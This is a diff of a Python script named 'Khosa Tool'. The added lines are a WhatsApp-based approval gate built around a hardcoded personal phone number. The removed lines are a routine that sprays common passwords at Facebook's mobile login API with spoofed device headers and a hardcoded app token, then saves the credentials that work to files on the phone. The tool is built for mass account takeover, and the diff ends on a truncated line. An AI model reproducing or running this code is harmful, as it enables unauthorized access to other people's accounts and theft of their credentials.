@@ -1,3 +1,32 @@
+import uuid, webbrowser
+
+print("=== KHOSA TOOL ===")
+
+# 1. Unique ID banao
+user_id = str(uuid.uuid4())[:8].upper()
+print(f"\nYour Approval ID: {user_id}")
+print("Ye ID WhatsApp pe bhej do approval ke liye\n")
+
+# 2. Auto WhatsApp open
+number = "923163458894"  # tumhara number
+msg = f"Assalamualaikum Bhai%0AApproval Key Chahiye%0AMy ID: {user_id}"
+url = f"https://wa.me/{number}?text={msg}"
+webbrowser.open(url)
+print("WhatsApp auto open ho gaya. ID send kar do.\n")
+
+# 3. Key mango
+key = input("Admin se mili key yahan paste karo: ")
+
+# 4. Key check
+correct_key = "APPROVED_" + user_id
+if key == correct_key:  
+    print("\n✅ Approved! Tool Start ho raha hai...")
+else:
+    print("\n❌ Wrong Key! Sahi key lagao")
+    exit()
+
+print("\nWelcome to Khosa Tool")
+print("----------------------------------\n")
 import os
 import re
 import time
@@ -417,48 +446,4 @@ def login_1(uid):
                 oks.append(uid)
                 break
             elif 'www.facebook.com' in res.get('error', {}).get('message', ''):
-                print(f"\r\r\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mAHB\x1b[38;5;196m) \x1b[1;97m= \x1b[38;5;46m{uid} \x1b[1;97m= \x1b[38;5;46m{pw} \x1b[1;97m= \x1b[38;5;45m{creationyear(uid)}")
-                open('/sdcard/Khosa-OLD-M1-OK.txt', 'a').write(f"{uid}|{pw}\n")
-                oks.append(uid)
-                break
-        loop += 1
-    except Exception:
-        time.sleep(5)
-
-
-def login_2(uid):
-    sys.stdout.write(f"\r\r\x1b[1;37m\x1b[38;5;196m+\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mAHB-M2\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[38;5;192m{loop}\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mOK\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[38;5;192m{len(oks)}\x1b[38;5;196m)")
-    
-    for pw in ('123456', '123123', '1234567', '12345678', '123456789'):
-        try:
-            with requests.Session() as session:
-                headers = {
-                    'x-fb-connection-bandwidth': str(rr(20000000, 29999999)),
-                    'x-fb-sim-hni': str(rr(20000, 40000)),
-                    'x-fb-net-hni': str(rr(20000, 40000)),
-                    'x-fb-connection-quality': 'EXCELLENT',
-                    'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA',
-                    'user-agent': window1(),
-                    'content-type': 'application/x-www-form-urlencoded',
-                    'x-fb-http-engine': 'Liger'
-                }
-                url = f"https://b-api.facebook.com/method/auth.login?format=json&email={str(uid)}&password={str(pw)}&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20¤tly_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true"
-                po = session.get(url, headers=headers).json()
-                if 'session_key' in str(po):
-                    print(f"\r\r\x1b[1;37m\x1b[38;5;196m\x1b[1;37m<\x1b[38;5;196m(\x1b[1;37mAHB\x1b[38;5;196m) \x1b[1;97m= \x1b[38;5;46m{uid} \x1b[1;97m= \x1b[38;5;46m{pw} \x1b[1;97m= \x1b[38;5;45m{creationyear(uid)}")
-                    open('/sdcard/Khosa-OLD-M2-OK.txt', 'a').write(f"{uid}|{pw}\n")
-                    oks.append(uid)
-                    break
-                elif 'session_key' in po:
-                    print(f"\r\r\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mAHB\x1b[38;5;196m) \x1b[1;97m= \x1b[38;5;46m{uid} \x1b[1;97m= \x1b[38;5;46m{pw} \x1b[1;97m= \x1b[38;5;45m{creationyear(uid)}")
-                    open('/sdcard/Khosa-OLD-M2-OK.txt', 'a').write(f"{uid}|{pw}\n")
-                    oks.append(uid)
-                    break
-        except Exception as e:
-            pass
-    loop += 1
-
-if __name__ == '__main__':
-
-        BNG_71_()
-        group_link = "https://chat.whatsapp.com/F2zGtYY4Ih1J9XaXQpdBMP?s=cl&p=a&ilr=0&amv=0"
+                print(f"\r\r\x1b[1;
